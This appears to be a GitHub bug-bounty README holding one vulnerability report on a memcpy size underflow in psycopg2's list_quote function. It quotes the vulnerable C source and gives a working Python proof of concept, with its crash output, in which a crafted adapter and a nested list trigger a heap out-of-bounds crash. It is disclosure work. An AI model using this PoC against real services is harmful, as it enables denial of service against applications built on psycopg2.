# BugBounties
list of bug bounties ive managed to find
# PostgreSQL memcpy DOS
this  might appear private, since it usually takes a few monthes for them to process: <br>https://huntr.com/bounties/08a6a855-4e3a-4bd3-bf83-5cf5692799aa <br>
heres a reported that was uploaded:<br>
### `adapter_list` uses a `memcpy()` that can copy `SIZE_MAX` bytes to a heap pointer in `psycopg` / `psycopg2`

**Status:** Pending
**Reported:** Jun 11th, 2026

### Description

In the following line:

```c
memcpy(ptr, s + 1, sl - 2);
```

the variable `sl` can have the value `1`, which causes `sl - 2` to become `-1` as a `Py_ssize_t`. When passed to `memcpy()`, this is converted to `SIZE_MAX`.

In order for this to happen, the following conditions are needed:

1. An adapter object with a `getquoted()` method that returns the value `b"'"`.
2. A list-type object registered to use the same adapter, so when `microprotocol_getquoted()` is called on it, it returns `b"'"`.
3. That list object is then placed inside another list.

This happens because the function never reaches:

```c
all_nulls = 0;
```

As a result, it goes into the `else` block where the vulnerable call is made:

```c
memcpy(ptr, s + 1, sl - 2);
```

The only check before this is whether the first byte is a single quote, which it is.

This causes an out-of-bounds read and write on the heap until the process reaches unreadable or unwritable memory and segfaults.

### Cause

```c
static PyObject *
list_quote(listObject *self)
{
    /*  adapt the list by calling adapt() recursively and then wrapping
        everything into "ARRAY[]" */
    PyObject *res = NULL;
    PyObject **qs = NULL;
    Py_ssize_t bufsize = 0;
    char *buf = NULL, *ptr;

    /*  list consisting of only NULL don't work with the ARRAY[] construct
     *  so we use the {NULL,...} syntax. The same syntax is also necessary
     *  to convert array of arrays containing only nulls. */
    int all_nulls = 1;

    Py_ssize_t i, len;

    len = PyList_GET_SIZE(self->wrapped);

    /* empty arrays are converted to NULLs (still searching for a way to
       insert an empty array in postgresql */
    if (len == 0) {
        /* it cannot be ARRAY[] because it would make empty lists unusable
         * in any() without a cast. But we may convert it into ARRAY[] below */
        res = Bytes_FromString("'{}'");
        goto exit;
    }

    if (!(qs = PyMem_New(PyObject *, len))) {
        PyErr_NoMemory();
        goto exit;
    }
    memset(qs, 0, len * sizeof(PyObject *));

    for (i = 0; i < len; i++) {
        PyObject *wrapped = PyList_GET_ITEM(self->wrapped, i);
        if (wrapped == Py_None) {
            Py_INCREF(psyco_null);
            qs[i] = psyco_null;
        }
        else {
            if (!(qs[i] = microprotocol_getquoted(
                    wrapped, (connectionObject*)self->connection))) {
                goto exit;
            }

            /* Lists of arrays containing only nulls are also not supported
             * by the ARRAY construct so we should do some special casing */
            if (PyList_Check(wrapped)) {
                if (Bytes_AS_STRING(qs[i])[0] == 'A') {
                    all_nulls = 0;
                }
                else if (0 == strcmp(Bytes_AS_STRING(qs[i]), "'{}'")) {
                    /* case of issue #788: '{{}}' is not supported but
                     * array[array[]] is */
                    all_nulls = 0;
                    Py_CLEAR(qs[i]);
                    if (!(qs[i] = Bytes_FromString("ARRAY[]"))) {
                        goto exit;
                    }
                }
            }
            else {
                all_nulls = 0;
            }
        }
        bufsize += Bytes_GET_SIZE(qs[i]) + 1;      /* this, and a comma */
    }

    /* Create an array literal, usually ARRAY[...] but if the contents are
     * all NULL or array of NULL we must use the '{...}' syntax
     */
    if (!(ptr = buf = PyMem_Malloc(bufsize + 8))) {
        PyErr_NoMemory();
        goto exit;
    }

    if (!all_nulls) {
        strcpy(ptr, "ARRAY[");
        ptr += 6;
        for (i = 0; i < len; i++) {
            Py_ssize_t sl;
            sl = Bytes_GET_SIZE(qs[i]);
            memcpy(ptr, Bytes_AS_STRING(qs[i]), sl);
            ptr += sl;
            *ptr++ = ',';
        }
        *(ptr - 1) = ']';
    }
    else {
        *ptr++ = '\'';
        *ptr++ = '{';
        for (i = 0; i < len; i++) {
            /* in case all the adapted things are nulls (or array of nulls),
             * the quoted string is either NULL or an array of the form
             * '{NULL,...}', in which case we have to strip the extra quotes */
            char *s;
            Py_ssize_t sl;
            s = Bytes_AS_STRING(qs[i]);
            sl = Bytes_GET_SIZE(qs[i]);
            if (s[0] != '\'') {
                memcpy(ptr, s, sl);
                ptr += sl;
            }
            else {
                memcpy(ptr, s + 1, sl - 2); // **THE VULN**
                ptr += sl - 2;
            }
            *ptr++ = ',';
        }
        *(ptr - 1) = '}';
        *ptr++ = '\'';
    }

    res = Bytes_FromStringAndSize(buf, ptr - buf);

exit:
    if (qs) {
        for (i = 0; i < len; i++) {
            PyObject *q = qs[i];
            Py_XDECREF(q);
        }
        PyMem_Free(qs);
    }
    PyMem_Free(buf);

    return res;
}
```

### PoC

A simple program that fills all the requirements.

This build works on Windows.

The program creates a list object, registers an adapter with a `getquoted()` method that returns `b"'"`, and then puts that list object inside another list.

The function iterates into the list, finds the list object, and aliases it as `b"'"`. After iterating, it still thinks every object is null, so it goes into the `else` block where it crashes in the corrupted `memcpy()`.

```python
from psycopg2.extensions import adapt, register_adapter
import faulthandler
import sys

faulthandler.enable()

print("start")

class ListObj(list):
    pass

class VulnAdapter:
    def __init__(self, obj):
        self.obj = obj

    def getquoted(self):
        print("VulnAdapter.getquoted called")
        return b"'"

register_adapter(ListObj, VulnAdapter)

try:
    value = [ListObj("SEGFAULT")]
    print("value:", value)

    a = adapt(value)
    print("adapter:", a, type(a))

    q = a.getquoted()
    print("quoted:",  q)

except BaseException as e:
    print("exception:", type(e).__name__, repr(e))

print("end")
```

### Output

```text
start
value: [['S', 'E', 'G', 'F', 'A', 'U', 'L', 'T']]
adapter: VulnAdapter.getquoted called
Windows fatal exception: access violation

Current thread 0x0000567c (most recent call first):
  File "C:\vuln.py", line 27 in <module>
```

### Impact

This can cause a DoS for an application or web server that offers a service using `psycopg2` client-side.

It may also be abused if, in future updates, `list_quote` is integrated to be used by the PostgreSQL server.
